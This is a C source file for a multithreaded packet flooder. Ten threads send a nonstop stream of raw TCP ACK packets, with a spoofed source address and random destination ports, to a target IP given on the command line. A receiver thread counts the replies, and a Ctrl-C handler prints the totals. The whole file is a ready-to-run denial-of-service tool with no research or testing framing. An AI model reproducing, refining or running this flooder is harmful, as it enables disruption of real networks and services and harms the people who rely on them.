#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdatomic.h>

#define NUM_THREADS 10
#define PORT_RANGE_START 1024
#define PORT_RANGE_END 65535

typedef struct {
    int thread_id;
    struct sockaddr_in addr;
} thread_args;

struct pseudo_header {
    uint32_t src_addr;
    uint32_t dest_addr;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Global packet counters
atomic_ulong packets_sent = 0;
atomic_ulong packets_recv = 0;

// Signal handler
void handle_sigint(int sig) {
    printf("\n--- Final Report ---\n");
    printf("Total Packets Sent: %lu\n", packets_sent);
    printf("Total Packets Received: %lu\n", packets_recv);
    exit(0);
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Sender thread
void *send_ack(void *arg) {
    thread_args *args = (thread_args *)arg;

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sockfd);
        pthread_exit(NULL);
    }

    while (1) {
        char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
        memset(packet, 0, sizeof(packet));

        struct iphdr *ip_header = (struct iphdr *)packet;
        struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;

        inet_pton(AF_INET, "127.0.0.1", &ip_header->saddr);
        ip_header->daddr = args->addr.sin_addr.s_addr;

        ip_header->check = checksum((unsigned short *)ip_header, sizeof(struct iphdr));

        tcp_header->source = htons(rand() % (PORT_RANGE_END - PORT_RANGE_START + 1) + PORT_RANGE_START);
        tcp_header->dest = htons(PORT_RANGE_START + (rand() % (PORT_RANGE_END - PORT_RANGE_START + 1)));
        tcp_header->seq = htonl(1);
        tcp_header->ack_seq = htonl(1);
        tcp_header->doff = 5;
        tcp_header->ack = 1;
        tcp_header->window = htons(5840);
        tcp_header->check = 0;

        struct pseudo_header psh;
        psh.src_addr = ip_header->saddr;
        psh.dest_addr = ip_header->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
        memcpy(pseudo_packet + sizeof(struct pseudo_header), tcp_header, sizeof(struct tcphdr));

        tcp_header->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

        if (sendto(sockfd, packet, sizeof(packet), 0,
                   (struct sockaddr *)&args->addr, sizeof(args->addr)) > 0) {
            atomic_fetch_add(&packets_sent, 1);
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

// Receiver thread
void *recv_thread(void *arg) {
    (void)arg;
    int rsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rsock < 0) {
        perror("recv socket");
        pthread_exit(NULL);
    }

    char buffer[65535];
    while (1) {
        ssize_t n = recvfrom(rsock, buffer, sizeof(buffer), 0, NULL, NULL);
        if (n > 0) {
            atomic_fetch_add(&packets_recv, 1);
        }
    }

    close(rsock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <Target IP>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, handle_sigint);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, argv[1], &addr.sin_addr) <= 0) {
        perror("inet_pton");
        exit(EXIT_FAILURE);
    }

    pthread_t threads[NUM_THREADS];
    thread_args args[NUM_THREADS];

    // Start receiver thread
    pthread_t rthread;
    if (pthread_create(&rthread, NULL, recv_thread, NULL) != 0) {
        perror("pthread_create recv");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        args[i].thread_id = i;
        args[i].addr = addr;
        if (pthread_create(&threads[i], NULL, send_ack, &args[i]) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_join(rthread, NULL);

    return 0;
}
